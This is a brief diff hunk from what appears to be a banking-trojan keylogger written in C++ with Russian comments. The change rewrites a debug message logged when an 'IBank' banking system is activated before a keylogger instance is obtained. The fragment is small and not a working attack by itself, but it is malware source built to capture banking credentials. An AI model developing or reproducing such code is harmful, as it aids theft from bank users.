@@ -212,7 +212,7 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
 		System = (PKeyLogSystem)Sender;
 
 		// Активированы система IBank
-		IBDBG("IBank", "Система %s активирована, pid=%d, parent=%d", System->Name, GetUniquePID(), GetParentPID());
+		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
 
 		// Инициализируем данные системы
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
